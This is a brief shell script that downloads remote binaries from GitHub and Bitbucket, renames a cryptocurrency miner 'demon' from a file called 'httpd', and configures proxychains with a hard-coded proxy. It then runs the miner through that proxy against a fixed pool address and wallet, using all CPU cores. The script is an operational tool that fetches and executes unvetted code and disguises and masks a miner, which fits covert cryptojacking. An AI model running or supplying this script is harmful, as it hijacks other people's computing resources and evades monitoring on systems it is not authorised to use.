proxy="35.80.142.130" 
port="57649"
wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./demon -a yespowertide  -o 8.209.210.176:80 -u TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.$(echo $(shuf -i 1-9 -n 1)-ren) -p -x -t $(nproc --all)



